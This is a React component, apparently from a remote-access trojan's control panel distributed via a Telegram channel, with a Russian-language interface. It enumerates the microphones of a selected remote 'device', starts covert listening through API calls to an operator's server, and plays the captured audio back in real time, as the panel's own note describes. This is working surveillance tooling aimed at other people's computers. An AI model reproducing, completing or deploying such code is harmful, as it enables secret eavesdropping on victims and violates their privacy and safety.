// t.me/SentinelLinks

"use client"

import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { Mic, MicOff, Volume2, VolumeX, Radio, WifiOff } from "lucide-react"
import type { User } from "@/app/page"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { toast } from "sonner"

interface VoiceChatTabProps {
  selectedUser: User | null
}

interface Microphone {
  id: number
  name: string
  channels: number
  sampleRate: number
}

export function VoiceChatTab({ selectedUser }: VoiceChatTabProps) {
  const [isMicActive, setIsMicActive] = useState(false)
  const [isSpeakerActive, setIsSpeakerActive] = useState(false)
  const [isConnected, setIsConnected] = useState(false)
  const [microphones, setMicrophones] = useState<Microphone[]>([])
  const [selectedMic, setSelectedMic] = useState<number | null>(null)
  const [isLoadingMics, setIsLoadingMics] = useState(false)
  const audioContextRef = useRef<AudioContext | null>(null)
  const audioIntervalRef = useRef<NodeJS.Timeout | null>(null)
  const [serverConfig, setServerConfig] = useState({ apiIP: "127.0.0.1", apiPort: "8001" })

// t.me/SentinelLinks
  useEffect(() => {
    const saved = localStorage.getItem("grob-server-config")
    if (saved) {
      try {
        const config = JSON.parse(saved)
        setServerConfig({
          apiIP: config.apiIP || "127.0.0.1",
          apiPort: config.apiPort || "8001",
        })
      } catch (error) {
        console.error("[v0] Ошибка загрузки конфигурации:", error)
      }
    }
  }, [])

  useEffect(() => {
    if (isConnected && selectedUser) {
      loadMicrophones()
    } else {
      setMicrophones([])
      setSelectedMic(null)
    }
  }, [isConnected, selectedUser])

  const loadMicrophones = async () => {
    if (!selectedUser) return

    setIsLoadingMics(true)
    try {
      const response = await fetch(`http://${serverConfig.apiIP}:${serverConfig.apiPort}/api/audio/microphones`)
      const data = await response.json()

      if (data.success) {
        setMicrophones(data.microphones)
        if (data.microphones.length > 0) {
          setSelectedMic(data.microphones[0].id)
        }
        toast.success("Микрофоны загружены", {
          description: `Найдено ${data.microphones.length} устройств`,
        })
      }
    } catch (error) {
      console.error("[v0] Ошибка загрузки микрофонов:", error)
      toast.error("Не удалось загрузить микрофоны")
    } finally {
      setIsLoadingMics(false)
    }
  }

  const toggleMic = async () => {
    if (!selectedUser || selectedMic === null) return

    if (!isMicActive) {
      try {
        const response = await fetch(`http://${serverConfig.apiIP}:${serverConfig.apiPort}/api/audio/start`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ microphoneId: selectedMic }),
        })

// t.me/SentinelLinks
        const data = await response.json()

        if (data.success) {
          setIsMicActive(true)
          toast.success("Прослушивание начато")

          if (isSpeakerActive) {
            startAudioPlayback()
          }
        }
      } catch (error) {
        toast.error("Не удалось начать прослушивание")
      }
    } else {
      try {
        const response = await fetch(`http://${serverConfig.apiIP}:${serverConfig.apiPort}/api/audio/stop`, {
          method: "POST",
        })

        const data = await response.json()

        if (data.success) {
          setIsMicActive(false)
          stopAudioPlayback()
          toast.info("Прослушивание остановлено")
        }
      } catch (error) {
        toast.error("Не удалось остановить прослушивание")
      }
    }
  }

  const startAudioPlayback = () => {
    if (!audioContextRef.current) {
      audioContextRef.current = new AudioContext({ sampleRate: 44100 })
    }

    audioIntervalRef.current = setInterval(async () => {
      try {
        const response = await fetch(`http://${serverConfig.apiIP}:${serverConfig.apiPort}/api/audio/chunk`)
        const data = await response.json()

        if (data.success && data.audio) {
          const audioData = Uint8Array.from(atob(data.audio), (c) => c.charCodeAt(0))
          const float32 = new Float32Array(audioData.length / 2)
          const view = new DataView(audioData.buffer)
          for (let i = 0; i < float32.length; i++) {
            float32[i] = view.getInt16(i * 2, true) / 32768.0
          }

// t.me/SentinelLinks
          const audioBuffer = audioContextRef.current!.createBuffer(1, float32.length, 44100)
          audioBuffer.getChannelData(0).set(float32)

          const source = audioContextRef.current!.createBufferSource()
          source.buffer = audioBuffer
          source.connect(audioContextRef.current!.destination)
          source.start()
        }
      } catch (error) {
        console.error("[v0] Ошибка воспроизведения аудио:", error)
      }
    }, 50)
  }

  const stopAudioPlayback = () => {
    if (audioIntervalRef.current) {
      clearInterval(audioIntervalRef.current)
      audioIntervalRef.current = null
    }
  }

  const toggleSpeaker = () => {
    const newState = !isSpeakerActive
    setIsSpeakerActive(newState)

    if (newState && isMicActive) {
      startAudioPlayback()
      toast.success("Динамик включен")
    } else {
      stopAudioPlayback()
      toast.info("Динамик выключен")
    }
  }

  const toggleConnection = () => {
    const newState = !isConnected
    setIsConnected(newState)
    if (newState) {
      toast.success("Голосовой чат подключен")
    } else {
      toast.info("Голосовой чат отключен")
      setIsMicActive(false)
      setIsSpeakerActive(false)
      stopAudioPlayback()
    }
  }

  useEffect(() => {
    return () => {
      stopAudioPlayback()
      if (audioContextRef.current) {
        audioContextRef.current.close()
      }
    }
  }, [])

  if (!selectedUser) {
    return (
      <div className="flex-1 flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-primary/20 to-accent/20 flex items-center justify-center mx-auto mb-6">
            <Radio className="w-12 h-12 text-muted-foreground" />
          </div>
          <h3 className="text-xl font-semibold mb-2">Нет подключения</h3>
          <p className="text-muted-foreground">Выберите устройство для голосового чата</p>
        </div>
      </div>
    )
  }

  if (selectedUser.status !== "online") {
    return (
      <div className="flex-1 flex items-center justify-center bg-background">
        <div className="text-center">
          <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-destructive/20 to-destructive/10 flex items-center justify-center mx-auto mb-6">
            <WifiOff className="w-12 h-12 text-destructive" />
          </div>
          <h3 className="text-xl font-semibold mb-2">Устройство недоступно</h3>
          <p className="text-muted-foreground">
            {selectedUser.name} в данный момент {selectedUser.status === "offline" ? "отключено" : "неактивно"}
          </p>
        </div>
      </div>
    )
  }

  return (
    <div className="flex-1 bg-background p-6 overflow-auto">
      <div className="max-w-3xl mx-auto space-y-6">
        <Card className="p-8 bg-card border-2 border-primary/30">
          <div className="flex items-center gap-4 mb-8">
            <div className="w-16 h-16 rounded-full bg-gradient-to-br from-primary to-accent flex items-center justify-center">
              <Radio className="w-8 h-8 text-primary-foreground" />
            </div>
            <div className="flex-1">
              <h2 className="text-2xl font-bold">Голосовой чат</h2>
              <p className="text-muted-foreground flex items-center gap-2">
                {selectedUser.name} • {selectedUser.ip}
                <span className={`w-2 h-2 rounded-full ${isConnected ? "bg-green-500 animate-pulse" : "bg-muted"}`} />
              </p>
            </div>
          </div>

          <div className="space-y-6">
            <Button
              onClick={toggleConnection}
              variant={isConnected ? "default" : "outline"}
              className="w-full"
              size="lg"
            >
              {isConnected ? "Отключить голосовой чат" : "Подключить голосовой чат"}
            </Button>

            {isConnected && (
              <>
                <div className="space-y-3">
                  <label className="text-sm font-medium">Микрофон собеседника</label>
                  <Select
                    value={selectedMic?.toString()}
                    onValueChange={(value) => setSelectedMic(Number.parseInt(value))}
                    disabled={isLoadingMics || isMicActive}
                  >
                    <SelectTrigger className="w-full">
                      <SelectValue placeholder={isLoadingMics ? "Загрузка..." : "Выберите микрофон"} />
                    </SelectTrigger>
                    <SelectContent>
                      {microphones.map((mic) => (
                        <SelectItem key={mic.id} value={mic.id.toString()}>
                          {mic.name} ({mic.channels} канала, {mic.sampleRate} Hz)
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <Button
                    onClick={toggleMic}
                    variant={isMicActive ? "default" : "outline"}
                    className="h-24"
                    size="lg"
                    disabled={selectedMic === null}
                  >
                    <div className="flex flex-col items-center gap-2">
                      {isMicActive ? <Mic className="w-8 h-8" /> : <MicOff className="w-8 h-8" />}
                      <span>{isMicActive ? "Остановить" : "Прослушать"}</span>
                    </div>
                  </Button>

                  <Button
                    onClick={toggleSpeaker}
                    variant={isSpeakerActive ? "default" : "outline"}
                    className="h-24"
                    size="lg"
                    disabled={!isMicActive}
                  >
                    <div className="flex flex-col items-center gap-2">
                      {isSpeakerActive ? <Volume2 className="w-8 h-8" /> : <VolumeX className="w-8 h-8" />}
                      <span>{isSpeakerActive ? "Выкл. звук" : "Вкл. звук"}</span>
                    </div>
                  </Button>
                </div>

                {isMicActive && (
                  <div className="p-4 bg-secondary/40 rounded-lg text-center">
                    <div className="flex items-center justify-center gap-2 text-sm">
                      <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                      <span>Микрофон прослушивается</span>
                      {isSpeakerActive && (
                        <>
                          <span className="text-muted-foreground">•</span>
                          <span>Динамик активен</span>
                        </>
                      )}
                    </div>
                  </div>
                )}
              </>
            )}
          </div>
        </Card>

        <Card className="p-4 bg-secondary/20 border-primary/20">
          <p className="text-xs text-muted-foreground">
            <strong>Примечание:</strong> Голосовой чат позволяет прослушивать микрофон удаленного устройства в реальном
            времени. Для работы требуется подключение к API серверу через настройки в Админ панели.
          </p>
        </Card>
      </div>
    </div>
  )
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
